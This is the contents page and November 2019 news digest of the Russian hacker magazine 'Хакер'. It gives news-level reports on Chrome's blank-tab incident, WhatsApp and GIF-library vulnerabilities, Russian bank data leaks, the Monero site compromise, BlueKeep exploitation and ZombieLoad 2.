

                                                  Ноябрь 2019
            № 248
CONTENTS

    MEGANews
  Всё новое за последний месяц

    Блиц-интервью
  Алексей Лукацкий о построении защиты, «Гидре» и формуле взлома

    APT в Avast
  CISO Avast Джайла Балу об ата ке на компанию и о сложностях хорошей безопасности

     Android
  Дос туп к скры тым методам и обна ружение root

    Шах и мат!
  Как устроен нашумевший экс пло ит checkm8 и как им воспользоваться

    В королевстве PWN
  ROP-цепочки и ата ка Return-to-PLT в CTF Bitterman

    Посмотри в глаза малвари
  Гайд по работе с вредоносными фай лами для новичков

    Взламываем ESP32 раз и навсегда
  Извлечение ключей флеш-шиф рования и безопасной загрузки

    Вскрытая камера
  Как искать уязвимос ти в «умных» гад жетах на примере популярной IP-камеры

    Malware vs Wordpress
  Про веря ем защит ные пла гины в боевых усло виях

    Разбираем Loki-Bot
  Как устроены механизмы антиотладки бан ковского тро яна

    Сисад мин против системы
  О чем Эдвард Сноуден написал в авто биографии Permanent Record

    Кор поратив ный КоПИРАТ
  О кон фликтах меж ду работодателями и сотрудниками по исключительным правам

     Глубокий в-DoH
  Разбира емся, как работа ет DNS over HTTPS и кому (не) выгод но его внедрение

    История с кодовым замком
  Как я разработал задание на схемотехнику для стен да «Хакера» на ZeroNights

    Всех айфо нов командир
  Автоматизируем работу в iOS 13 с помощью «Команд»

    Вол шебные «паль чики»
  Как работа ют механизмы биометрической авториза ции по отпечатку пальца

     Тун нель во времени
  Выводим дан ные с компь ютера через Network Time Protocol

    Как мар кетологи убили Android
  Колон ка Евгения Зобнина

    Неинновационные инно вации
  Откуда рас тут корни тех нологий Apple

     Тит ры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





НЕУДАЧНЫЙ CHROME
Журналисты издания ZDNet обра тили внимание на инте ресный инцидент,
произошедший в этом месяце: эксперимент компании Google вызвал вол ну
негодования среди корпоративных пользователей. У множества людей прак‐
тически перестал  работать Chrome, показывая «белый  экран смерти»
(WSOD). Проблема проявилась только на терминальных серверах, работа‐
ющих под управлением Windows Server.
  Все началось 13 ноября 2019 года. Форум поддержки Google, баг‐трекер
Chrome и Reddit стали полниться сооб щениями от системных администра‐
торов, заявляющих о массовых проб лемах в работе с Chrome. Пострадавшие
утверждали, что вкладки в Chrome внезапно ста ли пус тыми и демонстрирова‐
ли WSOD, из‐за чего браузером не мог ли поль зоваться тысячи сотрудников,
ведь активная вкладка пустела прямо во время работы. В корпоративных сре‐
дах сотрудники попросту не могли сменить браузер и фактически лишились
возможности выпол нять свои обязанности.
  Администраторы компаний и организаций жаловались, что пострадали
тысячи сотрудников, а на попытки устра нить проб лему потрачено множество
часов. Некоторые и вовсе сочли, что пустые вкладки — это признак атаки
мал вари, и экстренно запустили аудит безопас ности в своих сетях. Разуме‐
ется, все это не могло не вылиться в финансовый ущерб.
   Как оказалось, причиной мас сового сбоя стал эксперимент инженеров
Google. Они тестировали функцию WebContents Occlusion, которая приоста‐
навливает работу вкладок в Chrome, когда пользователь переме щает окна
других приложений поверх Chrome и активная вкладка, по сути, становится
фоновой. Как нетрудно догадать ся, функция предназначена для улучшения
производительности браузера и оптимизации использования ресурсов.
Раньше она тестировалась в Chrome Canary и Chrome Beta, но теперь раз‐
работчики решили включить ее в ста бильной ветке, чтобы собрать больше
данных. Сначала функцию активировали на месяц примерно для 1% поль‐
зователей в стабильных релизах M77 и M78, а когда проблем не возникло,
вклю чили и для всех остальных.
  К сожалению, выяснилось, что при работе на терминальных серверах
под управлением Windows Server воз никает ошиб ка: вместо того чтобы при‐
остановить работу вкладок при переключении на другое приложе ние, бра‐
узер полностью выгружал эти вкладки, оставляя лишь пустые страницы.
  В настоящее время разработчики Chrome уже остановили эксперимент
и срочно передали новый файл конфигурации всем пользователям браузера
с помощью системы Finch, позволяющей им изменять настройки в активных
установках Chrome. Тем, для кого исправление не сработало, рекомендуется
вручную отключить следующие экспериментальные настройки:
 • chrome://flags/#webcontentsocclusion
 • chrome://flags/#calculatenativewinocclusion





Однако  такое решение проблемы спровоцирова ло еще большее  воз‐
мущение системных администра торов. Многие даже не подоз ревали, что
инженеры Chrome могут проводить подоб ные эксперименты, не говоря о том,
что они могут отправлять любые изменения в браузеры пользователей
без предварительного одобрения. ZDNet цитирует сообщения пос традавших
администраторов:



     «Вы  видите,  какое  воз действие  ока зали  на  тысячи  из  нас
      без  каких‑либо  пре дуп режде ний  или  объясне ний? Мы  не ваши
      подопытные. Мы пре дос тавляем профес сиональные услу ги для мно-
      гомиллионных программ. Вы понима ете, сколько часов было пот-
      рачено впус тую из‑за вашего „экспе римента“?»
         «Сколько десятков тысяч долларов это „упс“ будет всем стоить?
      Это уже выглядит как весьма круп ная ошибка со стороны Google».


50 000 000 ПОИС КОВЫХ ЗАПРОСОВ В СУТКИ


Разработчики поисковика DuckDuckGo, основными принципами которо го называют конфиден‐
циальность и анонимность, поделились официальной статистикой. Так, в ноябре текуще го года
поисковик преодолел отметку в 50 000 000 поисковых запросов в сутки. То есть за последний
год (с ноября 2018‐го по ноябрь 2019‐го) число зап росов увеличилось почти на 19 000 000.

Кроме того, если в 2010 году общее количество запросов равнялось всего 16 000 000, то
в 2019‐м, который еще не закон чился, это значение уже перевалило за 11 000 000 000.





И СНОВА WHATSAPP
В мессенджере WhatsApp устранили кри тичес кую ошибку, при помощи
которой злоумышленники могли уда лен но скомпрометировать устройство
и похитить защищен ные сообщения чата и файлы пользователя.
   Уязвимость имеет идентификатор CVE‐2019‐11931 и представляет собой
проблему перепол нения буфера  стека. Ошиб ка воз никала  из‐за  того,
как WhatsApp парсил элементарный поток метаданных в файлах MP4.
Это давало злоумышленникам воз можность устроить DoS‐атаку или удаленно
выпол нить произволь ный код.
   Все, что требовалось для уда ленной экс плуатации бага, — знать телефон‐
ный номер цели и отправить ей через WhatsApp вре доносный файл MP4.
Такой файл мог приводить к автоматичес кой установке бэкдора или шпи‐
онского  приложения  на  скомпромети рованное  устройство,  фактически
передавая контроль в руки атакующих.
   Уязвимость затрагивала WhatsApp для всех основных платформ, включая
Google Android, Apple iOS и Microsoft Windows. По информации компании
Facebook, которой принадлежит мессенджер, спи сок уязвимых версий выг‐
лядит следующим образом:
 • Android версии до 2.19.274;
 • iOS версии до 2.19.100;
 • Enterprise Client версии до 2.25.3;
 • Windows Phone версии до 2.18.368 включительно;
 • Business for Android версии до 2.19.104;
 • Business for iOS версии до 2.19.100.

Пока неизвестно, исполь зовалась ли уяз вимость зло умышленниками до того,
как разработчики выпус тили обновление. Интересно, что проблема во мно‐
гом похожа на другую недавно обна руженную в WhatsApp уязвимость, из‐за
эксплуатации которой Facebook об ратилась в суд с иском против израиль‐
ской компании NSO Group, занимающей ся разработкой и продажей шпи‐
онских решений и так называемой легальной малвари. Дело в том, что,
по данным Facebook, сотрудники NSO Group не только знали о том баге, но и
использовали его для компромета ции устройств более чем 1400 человек
в Бахрейне, Объединенных Араб ских Эмиратах и Мексике.
   Хуже того, специалис ты Trend Micro обнаружили, что исправленная в мес‐
сенджере уязвимость опас на и для мно жества других приложений. Баг отно‐
сится к классу double‐free и получил идентификатор CVE‐2019‐11932. Проб‐
лема позволяет удаленно выполнять код на устройствах с Android 8.1 и 9.0, а в
предыдущих вер сиях мобильной ОС баг можно использовать для провоци‐
рования отказа в обслуживании (DoS).
  Проблема связана с опенсорсной биб лиотекой libpl_droidsonroids_gif.so,
которая входит в пакет android‐gif‐drawable и используется многими при ложе‐
ниями для Android при обра ботке файлов GIF. И если в WhatsApp баг устра‐
нили с релизом версии 2.19.244, то в дру гих при ложениях уязвимость
по‐прежнему существует.





По информации исследова телей, только в каталоге Google Play по‐прежнему
уязвимы более 3000 приложений, использующих libpl_droidsonroids_gif.so.
Хуже того, проблема угро жает и мно гим приложениям из сторонних катало‐
гов, таких как 1mobile, 9Apps, 91 market, APKPure, Aptoide, 360 Market, PP As‐
sistant, QQ Market и Xiaomi Market.


ПАВЕЛ ДУРОВ НЕ УПУС ТИЛ ШАНС
После того как в WhatsApp закрыли очередную критическую уязвимость, позволяющую ском‐
прометировать устрой ство и похитить защищенные сообщения чата и файлы пользователя,
Павел Дуров в который раз выступил с критикой мес сенджера.





→«WhatsApp не только не защищает ваши сообщения, но и пос тоянно используется как тро‐
янский конь для слежки за вашими фотографиями и сообщениями, которые к WhatsApp
не относятся.
   Невзирая на постоянно усиливающиеся свидетельства того, что WhatsApp — это лишь при‐
манка для людей, которые до сих пор доверяют Facebook в 2019 году, существу ет возможность
того, что WhatsApp случайно внедряет критические уяз вимос ти во все свои приложе ния каждые
несколько месяцев. Но я в этом сомневаюсь, ведь за шесть лет, прошедшие с момен та запус‐
ка, у Telegram, похожего по своей сложности приложения, не было серьезных проблем на уров‐
не WhatsApp. Маловероятно, что кто‐либо на регулярной осно ве случай но допускает столь
серьезные ошибки в области безопасности, так удобно подходящие для слеж ки.
   Вне зависимости от истинных намерений материн ской компании WhatsApp [име ется в виду
Facebook. — Прим. ред.], рекомендации для конеч ных пользовате лей все те же: если вы
не хотите, чтобы рано или поздно все ваши фотог рафии и сообщения стали общедос тупны, вы
должны удалить WhatsApp со своего телефона»
— пишет Дуров в своем Telegram‐канале





УТЕЧКИ ДАННЫХ
Ноябрь продолжил череду утечек данных, обнаруженных у рос сийских банков
и не только у них. В частнос ти, в этом месяце ста ло известно о «слитых» дан‐
ных пользователей ВТБ и «Альфа‐банка».


Бан ки
В начале ноября журналисты РБК сооб щили, что в Сети выставлена на про‐
дажу информация о вла дельцах кредитных карт «Альфа‐банка» и клиентах
«АльфаСтрахования». Продавец, опуб ликовавший объ явление на одном
из специализированных форумов, заявил, что у него есть све жие данные при‐
мерно 3500 клиентов бан ка и около 3000 клиентов «АльфаСтрахования».
  В бесплатном «пробнике», который предос тавляет продавец, тринадцать
договоров клиентов «Альфа‐банка» и десять договоров клиентов «Аль‐
фа‐Страхования». В договорах содержатся фамилия, имя, отчество, номер
мобильного телефона, пас портные данные, адрес регистрации, сумма кре‐
дитного лимита или оформленной стра ховки, предмет страхования, а также
дата заключения догово ра. По сло вам про давца, все договоры «Альфа‐бан‐
ка», которые есть у него в рас поряжении, оформлены в октябре, а база выг‐
ружена 22 октября текущего года. Договоры, заключенные в «АльфаСтра‐
ховании», оформле ны в один день — 8 мая 2019 года.
  Журналисты РБК проверили дос товерность этой информации. При попыт‐
ке перевести клиентам банка день ги через мобиль ное приложе ние по номеру
телефона в 11 случаях из 13 имена, отчества и первые буквы фамилий в при‐
ложении сов пали с теми, что ука заны в догово ре, у оставшихся двух номера
телефонов к карте банка не привяза ны. Доз вонить ся удалось до девяти кли‐
ентов: большинство из них, в том числе те, кого не удалось проверить через
мобильное приложение, подтвердили, что недавно оформляли кредитную
карту в «Альфа‐банке». Одному из клиентов уже успели поз вонить мошен‐
ники, он заблокировал карту.
  Данные клиентов, ука занные в договорах «АльфаСтрахования», в резуль‐
тате проверки не подтвердились. Часть догово ров не содержит ФИО
или номер телефона, еще в нес коль ких записа ны ошибочные отчес тва
и предмет страхования. Доз вониться удалось только по четырем номерам
из десяти, никто из собеседников не смог в пол ной мере подтвердить
информацию.
  Представите ли «Альфа‐банка» уже подтвердили СМИ факт утечки пер‐
сональных данных небольшого количества клиентов. Сообщается, что на дан‐
ный момент бан ку достоверно известно о незаконном распространении пер‐
сональных данных 15 клиентов. Банк уже проводит внутреннее расследова‐
ние «по выяв лению мас штаба инцидента и обстоятельств, в результате
которых такие данные стали доступны треть им лицам».



      «Дос товер но  уста нов лено,  что  воз никновение  данной  ситу ации
      не является следс твием наруше ния защиты кор поратив ной информа-
      ционной сис темы банка. Утеч ка не под вергает опас ности средс тва
      на сче тах клиентов, так как не содер жит никаких данных, необходимых
      для дос тупа к сче там», — под черки вает пред ста витель «Альфа‑банка».

Попавшие в открытый доступ договоры действительно не содержат номера
карт и CVV‐коды, однако утекшие данные все равно могут быть использованы
мошенниками в сочетании с приемами социальной инженерии и фишинга.
Так, злоумышленники могут поз вонить клиенту под видом банка и выяснить
сведения, необходимые для кражи денег.
  Представитель «АльфаСтра хования» сообщил РБК, что компании «извес‐
тно о фактах размещения в интернете объявлений о продаже данных
по договорам страхования электронных устройств». «АльфаСтрахование» уже
ввело дополнительные меры безопасности, сейчас оно проводит рассле‐
дование и проверяет опуб ликованные данные. «Даль нейшие меры, которые
будет предпринимать компания, будут определены на основании результатов
расследования», — добавил он.
   Вскоре после это го газета «Известия» сооб щила, что в продаже на чер‐
ном рынке также появилась информа ция о вкладчиках ВТБ: в общей слож‐
ности 5000 строк данных. Продавец сооб щил журналистам, что 3000 строк
из 5000 можно купить «из первых рук» и такая информация будет стоить
по 10 рублей за строку. Оставшиеся 2000 строк можно при обрести «из вто‐
рых рук» (то есть продавец — не первый владелец) по 6 руб лей за строку.
  В фрагменте базы данных, который попал в распоряжение «Известий»,
содержалась пер сональная информация о 21 вкладчике ВТБ, включая
фамилию,  имя,  отчество, домашний  адрес,  индекс, номер телефона,
информацию о сумме вклада, а также адрес электронной почты.
   «Известия» проверили десять записей через мобильное приложе ние бан‐
ка, где при переводе средств мож но увидеть имя и первую букву фамилии
клиента. Оказалось, что номера телефо нов действительно при вязаны к сче‐
там ВТБ, а доступные персональные данные совпадают с указанными в дам‐
пе. При этом журналистам уда лось оперативно свя заться с четырьмя вклад‐
чиками, которые подтвердили свои имя и наличие депозита в финансовой
организации на данный момент. Один из клиентов сказал, что сумма вклада
действительно совпадает с указанной в тестовом фрагменте.
  Представите ли ВТБ уже провели расследование случившегося и подтвер‐
дили факт утечки:



      «Было выяс нено, что эти све дения были акту альны по сос тоянию
      на 2016 год. Банк связался со все ми клиента ми, чья лич ная информа-
      ция могла быть ском прометирова на, пре дуп редил о слу чив шемся
      и принес свои извинения. Их информа ционной безопас ности ничего
      не угрожает. Обра щаем внимание, что утеч ка не содер жит никаких
      данных, необходимых для дос тупа к сче там», — сообщили пред ста-
      вите ли банка.

Также в банке отме тили, что в компании существу ет сис тема разграниче ния
прав доступа к информации и «на регулярной осно ве осу ществляется жес‐
ткий контроль действий пользователей при работе с конфиденциальными
данными».


Про чие
Однако только банками дело не ограничилось. Также в этом месяце стало
известно, что утечки пользовательских данных допус тили еще несколько
организаций:
 • СМИ заметили утечку данных пользователей портала для поиска работы
   Job in Moscow
 • Компания OnePlus сооб щила об утечке пользовательских данных
 • Обнаружилось, что сотрудник Trend Micro про давал пользовательские дан‐
  ные скамерам
 • Форумы ZoneAlarm были скомпро метированы из‐за уяз вимости в vBulletin


БОЛЬШОЙ БРАТ СЛЕДИТ ЗА ТОБОЙ
Согласно отчету неправительственной организации Freedom House, которая занимается иссле‐
дованиями политических и граждан ских свобод, в интернете следят практически за всеми. Так,
свежий отчет экспертов был посвящен кибершпионажу и слежке, которой ежедневно подверга‐
ются рядовые пользователи.

40 из 65 изученных стран (около 62%) организовали комплексную слежку за пользователями
в социальных сетях.

Это означает, что под наблюдением находятся 89% пользователей интерне та, то есть пример‐
но 3 000 000 000 человек.





Китай был назван страной с наиболее ограничен ной свободой, а сле дом за ним в списке идут
Египет и Россия.

В Иране за всем происходящим в Сети пристально следят примерно 42 000 добровольцев,
отчитывающихся властям.





КРИПТОВАЛЮТНЫЕ
ВЗЛОМЫ
Ноябрь 2019 года ознаменовался сразу дву мя крупными криптовалютными
взломами.


Monero
Официальный сайт крип товалюты Monero, GetMonero.com, предоставляющий
бинарники для Linux и Windows, был скомпрометирован и рас пространял мал‐
варь, ворующую средства пользователей.
  Инцидент произошел 18 ноября 2019 года. Первыми нечто странное
заметили пользователи, о чем и пос пешили сообщить на GitHub. Дело в том,
что хеш (SHA‐256) 64‐разрядно го бинарника для Linux не соответствовал
хешу, указанному на официальном сай те, а это зна чило, что файл был изме‐
нен. Вскоре после этого сообщения раз работчики Monero подтвердили факт
компрометации.


                                     Продолжение статьи →
← Начало статьи





  Как минимум один пользователь сообщил на Reddit о потере средств
   в результате данной атаки, тем самым подтверждая, что мал варь была
  нацелена на кражу криптовалю ты. «Примерно через девять часов после того,
   как я запустил бинарник, одна транзакция опус тошила мой кошелек и вывела
  все 7000 долларов», — писал пос традавший.
     Анализ Linux‐малвари показал, что после того, как пользователь открыл
  или создал новый кошелек, его seed переда вался на сервер node.hash‐
  monero.com. Затем малварь отправляла средства с кошелька на серверы
   node.xmrsupport.com и 45.9.148.65. Вредоносный CLI‐кошелек для Windows
  действовал практически так же.
     Разработчики  Monero  пока  заняты  расследованием  случившегося.
  Как именно был скомпрометирован сервер загрузок, неясно, но сообщается,
   что в настоящее время опасать ся уже нечего, поскольку все файлы теперь
  раздаются из резервного источника.


  Upbit
  Еще одной жертвой преступников стала южно корейская криптовалютная бир‐
  жа  Upbit. Неизвестные злоумышленники похитили 342 тысячи Ethereum
  из горячего кошелька бир жи, то есть примерно 48,5 миллиона долларов
  по курсу на момент атаки.
     27 ноября 2019 года Upbit временно при остановила работу, запретив
  ввод и вывод средств, а все активы бир жи пока были переведены в холодные
  кошельки. Согласно официальному заявлению разработчиков, работа ресур‐
  са дол жна возобновиться ориентировочно через две недели. Также предста‐
   вители биржи пообещали, что возместят поль зователям весь ущерб, хотя
  пока не уточнили, как именно это будет реализова но.
    На Reddit и в социальных сетях сообщение о взломе уже поставили
  под сомнение, так как пользователи полагают, что на самом деле это может
  быть попытка exit scam’а или работа инсайдеров. В частнос ти, подозрения
  вызывает, что хищение произошло тогда, когда Upbit занималась запланиро‐
  ванным перемещением средств.


  32 768 ЧАСОВ ДО ОТКАЗА РАБОТЫ


   Инженеры Hewlett Packard Enterprise предупредили, что у твер дотельных накопи телей HPE SAS
   с версиями прошивки до HPD8 выявилась неприятная проблема: они могут отказать пос ле
  32 768 часов работы (3 года, 270 дней и 8 часов), и ни сам накопитель, ни дан ные спасти уже
   не удастся.


   Багу подвержены как отдельные продукты, так и включен ные в состав прочих решений ком‐
   пании, в том числе ProLiant, Synergy, Apollo, JBOD D3xxx, D6xxx, D8xxx, MSA, Store-
   Virtual 4335 и StoreVirtual 3200.
   Полный список уязвимых моделей можно найти на сайте компании, рав но как и ссыл ку на кри‐
   тически важное обновление прошивки.





 ЭКСПЛУАТАЦИЯ
 BLUEKEEP
  ИБ‐эксперты зафиксировали первую кампанию, мас сово использующую экс‐
  плоит для уязвимости BlueKeep. К счастью, пока активен не саморазмно‐
  жающийся червь, как ранее опа сались эксперты: при помощи уязвимости
  распространяется лишь криптовалютный майнер.
    Напомню, что критическая уязвимость CVE‐2019‐0708 (она же BlueKeep),
  связанная с работой Remote Desktop Services (RDS) и RDP, была исправлена
   Microsoft еще в мае текущего года. С помощью этого бага атакующие могут
  выпол нять произволь ный код без авториза ции и распространять свою мал‐
  варь подобно червю, как, например, было с извес тны ми вредоносами Wan‐
  naCry и NotPetya. Проб лема опасна для Windows Server 2008, Windows 7, Win‐
  dows 2003 и Windows XP, для которых, из‐за серьезности угрозы, были
  выпущены обновле ния безопас ности.
    В сентябре текуще го года разработ чики Metasploit опубликовали в откры‐
  том доступе демонстрационный эксплоит для BlueKeep, и теперь злоумыш‐
  ленники используют именно это решение.
    Обнаруженная специалистами вредоносная кампания оказалась активна
  с 23 октября 2019 года, и первым ее заметил известный британский спе‐
  циалист Кевин Бомонт (Kevin Beaumont). Ата ку зафиксировали honeypot‐сер‐
  веры, созданные им много месяцев назад, о которых даже сам эксперт уже
  успел забыть. Вскоре наб людение Бомонта подтвердил и другой эксперт —
  Маркус «MalwareTech» Хатчинсон, который, в час тности, известен благодаря
   тому, что остановил эпидемию WannaCry.
     Как уже было сказано, вопреки опасениям специалис тов, пока эксплуата‐
  ция BlueKeep сов сем не похожа на эпи демии, подобные WannaCry, NotPetya
  и Bad Rabbit. Дело в том, что пока злоумышленни ки не используют воз‐
  можности  BlueKeep  для  соз дания  саморас пространяющейся  угрозы.
  По‐видимому, сейчас хакеры находят уязвимые Windows‐сис темы с откры‐
  тыми портами RDP, используют экс плоит раз работчиков Metasploit и устанав‐
  ливают таким образом майнер криптовалют.
     Также Бомонт пишет, что пока атаки, похоже, не работают как дол жно: они
  лишь вынудили 10 из 11 «приманок» аварийно завершить работу. Об этом
  на протяжении последних месяцев не раз говорили ИБ‐специалисты: экспло‐
   ит трудно заставить работать как нужно, не про воци руя при этом воз никно‐
  вение BSOD. Интересно, что недавно появилась информация, буд то в ско‐
  ром времени эксплоит будет исправлен и перера ботан таким образом, чтобы
  не вызывать BSOD.
     После сообщения о первых атаках эксперты Microsoft поспешили предуп‐
   редить, что в будущем нас явно ожидают более разрушительные атаки,
  использующие BlueKeep, и расслаб лять ся пока рано.



         «Хотя на момент написа ния этой статьи не было совер шено дру гих
          атак, связанных с вымога телями и дру гим вре донос ным ПО, через
         экс плу ата цию BlueKeep, скорее все го, будут дос тавляться и дру гие
         полез ные нагрузки, более эффектив ные и раз рушительные, чем май-
         неры. BlueKeep можно экс плу атировать, не оставляя явных сле дов,
        и пользовате ли должны тща тельно проверять сис темы, которые уже
         могут быть зараже ны или ском прометирова ны», — пре дуп режда ют
         экспер ты в официальном блоге ком пании, еще раз напоминая поль-
         зовате лям о необходимос ти сроч но уста новить исправ ления.

  Хотя для установки исправлений у компаний и поль зователей были месяцы,
  BlueKeep по‐прежнему представляет опасность, так как в Сети до сих пор
  насчитывается порядка 750 тысяч уязвимых Windows‐систем (не считая тех,
   что расположены внутри час тных сетей, за брандмауэрами).


 ЭДВАРД СНОУДЕН СТАВИТ ВОПРОСЫ
   Эдвард Сноуден выступил по видеосвязи на сам мите Web Summit, прошедшем в Лиссабоне
   в начале ноября. Там он традиционно много говорил о приватности, проблематике сбора дан‐
   ных и растущей мощи интернет‐корпораций. Также Сноуден отметил, что создание Общего
   регламента по защите данных (GDPR) — на деле не решение, а пока лишь бесполезный «бумаж‐
   ный тигр».





  →«Как быть, если самые влиятель ные инсти туты в обществе стали наиме нее ответс твен‐
   ными?
       Когда мы наблюдаем, что правительства и корпорации работают сообща, можно видеть,
   как зарождается некая совокупность, ни один из учас тников которой не действу ет по‐нас‐
   тоящему независимо или конфронтационно, скорее они становятся левой и правой рукой одно‐
   го и того же тела.
      Если вы создаете неодолимую силу, независимо от того, принадлежит она Facebook
   или какому‐либо правительству, вопрос в том, как вы собираетесь контро лировать проявле ния
   этой силы, когда она будет использована против общес тва, а не ради его блага»
  — заявил Сноуден





 НА СТРАЖЕ
 GOOGLE PLAY
  Компании Google, ESET, Lookout и Zimperium объявили о создании App De‐
   fense Alliance, чьей целью, как следует из названия, станет выявление вре‐
  доносных  приложений  и  защита  пользователей. Компании  объединят
  механизмы обнаружения угроз и в итоге улучшат механиз мы проверки
  безопасности, которые Android‐приложения про ходят перед публикацией
   в Play Store.
    В настоящее время, ког да разработ чик соз дает при ложе ние для Android
  и отправляет его на рас смотрение для публикации, оно изучается только сот‐
  рудниками Google, с помощью систем Bouncer и Google Play Protect.
     Хотя в прошлом предста вители IT‐гиганта уверяли, что защита Play Protect
  отлично работает, специалисты с ними не сог лашались. К примеру, по дан‐
  ным AV‐TEST, на Google Play Protect вряд ли мож но положиться: система
  Google блокирует лишь 62% вредоносных файлов во вре мя тестов в реаль‐
  ном времени, тогда как средний показа тель среди защитных решений
  равен 97,8%.
    В результате в официальный каталог приложений то и дело проникает
  мал варь, обходя все проверки. К примеру, вредонос может загружаться
  на устройство жертвы позднее, уже после того, как пользователь установил,
  казалось бы, безвредное приложение. Или малварь может быть оснащена
  специальным таймером и начинает вредонос ную активность лишь спустя
  несколько часов или даже дней после уста новки. Так, по данным специалис‐
   тов ESET, только в сентябре 2019 года в Play Store было обнаружено 172 вре‐
  доносных приложения, которые нас читывали более 335 952 400 загрузок.
     Теперь в Google наконец решили признать существование проблемы,
  и для ее решения был создан App Defense Alliance, в рамках которого сис‐
  темы обнаруже ния Google Play Protect будут интегрированы с антивирусными
  решениями партнеров.


 «ШКОЛЬНЫЙ» DDOS

   Эксперты «Лаборатории Каспер ского» обнародовали статистику о тенденциях в развитии
   DDoS‐атак в третьем квартале 2019 года. Как оказалось, общее число DDoS‐атак уве личилось
   на треть (32%) по сравнению с аналогичным периодом 2018 года.

   Пиковым месяцем квартала стал сентябрь — за 30 дней в начале осени было зафик сировано
  53% всех DDoS‐атак в отчетном периоде. Что характерно, более половины этих атак (60%)
   были направлены на ресурсы, связанные со сферой образования: электрон ные дневники,
   сайты образовательных учрежде ний и так далее.

   По мнению аналитиков, причина очевидна: учащиеся вернулись в шко лы и с большой долей
   вероятности могли организовать атаки из хулиган ских побуждений. При мечательно, что Рос-
   сия оказалась в топе стран, где были обнаружены DDoS‐атаки на образовательные ресурсы.

   Самая длинная атака прошедшего квартала продол жалась 279 часов (11,6 суток) и была нап‐
   равлена против китай ского провайдера связи.

   Статистическое большинство атак происходило в понедельник (18%).

   Лидирует по количеству атак по‐прежнему Китай, с практически не изменившейся долей
   по сравнению со вторым кварталом (62,97% вместо 63,80%).





   Самым распространенным типом атак остается SYN‐флуд с долей 79,7%, на втором месте —
   UDP‐флуд с долей 9,4%. Наиме нее популярен ICMP‐флуд (0,5%).





 ZOMBIELOAD 2
  В мае текущего года исследова тели рас крыли информацию о новом клас се
   уязвимостей в процессорах компании Intel: Microarchitectural Data Sampling
  (MDS). Равно как и уязвимости Spectre и Meltdown, новые баги оказались свя‐
  заны  с упреждающим  (или спекулятивным —  speculative) механизмом
  исполнения команд. Тогда эксперты выделили четыре уяз вимости и три груп‐
  пы проблем: RIDL, Fallout и ZombieLoad. Все эти баги позволяют атакующему
  похищать пароли, криптогра фические ключи и про чие личные данные, заг‐
  ружаемые в память буферов процес сора.
     Как выяснилось теперь, у ZombieLoad, самой опасной из найденных проб‐
   лем, имеется второй вариант (CVE‐2019‐11135), который представляет угрозу
  и для более новых процессоров Intel, включая Cascade Lake. Ранее счи‐
   талось,  что  эти  процессоры  не  подвержены  подобным  атакам,  так
   как защищены на аппаратном уровне.
    В рамках ноябрьского «вторника обновлений» инженеры Intel уже выпус‐
   тили обновления микрокодов, исправляющие проб лему ZombieLoad 2.
     Оказалось, весной текущего года эксперты умол чали о сущес твовании
   CVE‐2019‐11135, так как у раз работчиков Intel еще не были готовы патчи.
  Теперь же исследователи рас сказали, что работа второй вариации Zom‐
   bieLoad связана с исполь зованием технологии Intel Transactional Synchroniza‐
   tion Extensions (TSX) и асинхронного прерывания.
    Фактически  зло умышленник  может  использовать  вре доносный  код
  для создания кон фликта между операциями чтения внутри ЦП. В итоге может
  произойти утечка данных, обра батываемых процес сором. Исследователи
   пишут, что атака работает даже против машин с аппаратными исправлениями
  для уязвимости Meltdown (в частнос ти, тестировались i9‐9900K и Xeon Gold
   5218). И единственное обязательное условие для атаки — необ ходимость
  поддержки  Intel TSX, дос тупной по умолчанию во всех процес сорах  Intel,
  выпускаемых после 2013 года (первыми поддержкой TSX обзавелись процес‐
  соры Haswell).
     Представите ли Intel не только опуб ликова ли обновленные микрокоды, но и
  поспешили заверить, что ZombieLoad 2 не так опасна, как может показаться.
  Дело в том, что все атаки MDS позволяют выполнять вредоносный код
  на процессорах Intel, но при этом зло умышленники не могут контролировать,
   какие данные они извлекают. По сути, инженеры Intel уверяют, что у прес‐
   тупников есть другие, куда более прос тые способы и средс тва для хищения
  данных у целей.
     Так как патчи для спекулятивных атак, как пра вило, ведут к потенциальному
  падению  производитель нос ти  системы,  многие  пользователи  могут
  не захотеть устанавливать очередное обновление. В этом слу чае  Intel
  рекомендует отклю чить поддержку TSX, если она не слишком нужна.
     Разработчики Windows и Linux, в свою очередь, уже рассказали о том,
   как можно защититься от ZombieLoad 2, а именно об отключении Intel TSX.


  6000 BITCOIN‐БАНКОМАТОВ УСТАНОВ ЛЕНО ПО ВСЕМУ
 МИРУ
   Исследователи из Coin ATM Radar обнародовали статис тику по количес тву криптовалютных
   банкоматов, установленных в различных странах мира.

   По данным Coin ATM Radar, в нас тоящий момент в мире насчитывается более 6000 таких
   машин.

  65% из них расположены на территории США, на Европу приходится 20% всех установленных
   банкоматов, а вот в странах Азии, невзирая на большую популярность криптовалют, установ‐
   лены лишь 2% от общего числа бан коматов.

   Каждый день в мире появляется пример но 11 новых машин.

  В США сейчас 3924 крип товалютных банкомата, 653 — в Канаде, а третье и четвертое места
   в списке занимают Великобритания (272 машины) и Авс трия (189 машин).

   Россия находится на девятом мес те: в нашей стране нас читывается 62 таких бан комата.





                                        Продолжение статьи →
← Начало статьи





 GITLAB БОИТСЯ
 РУССКИХ
  В компании GitLab прошло интересное обсуждение воз можного запрета при‐
  нимать на работу специалис тов из Китая и Рос сии.
     Эрик Джонсон (Eric Johnson), вице‐президент GitLab по инже нерным раз‐
  работкам, объяснил, что поводом для обсуждения послужило бес покойство
  корпоративных клиентов, которых тревожит геополитичес кая ситуация в этих
   двух странах.
     Нужно пояснить, что речь идет о сот рудниках, которые оказывают тех‐
  ническую  поддержку  таким  клиентам:  это  специалисты  Support, SRE
   в области инфраструктуры, SecOps и Anti‐Abuse в отделе Security. Дело в том,
   что у этого вспомогательного персонала есть полный доступ к данным ком‐
   паний. Как пишет Джонсон, корпоративные клиенты опасаются, что сотрудни‐
   ки из России и Китая могут похищать данные, а спецслужбы способ ны при‐
   нудить их к сотрудничеству и разглашению коммерчес кой тайны.
     У GitLab нет возможнос ти огра ничивать доступ сотрудников в зависи мос ти
   от конкретной страны, и в компании не хотят, чтобы в командах появились
  люди, которые не смогут выполнять свои обязанности на все сто процентов.
  При этом подчеркивается, что запрет не будет распространяться на другие
  должности и не помеша ет людям из Китая и Рос сии писать код.
     Глава GitLab Сид Сиб ранди (Sid Sijbrandij) прокомменти ровал, что в нас‐
  тоящее время компания вообще не нанимает персонал поддержки из Китая
  и России, так что из‐за будущего запрета, который, скорее все го, будет при‐
   нят, никто не должен лишиться работы.


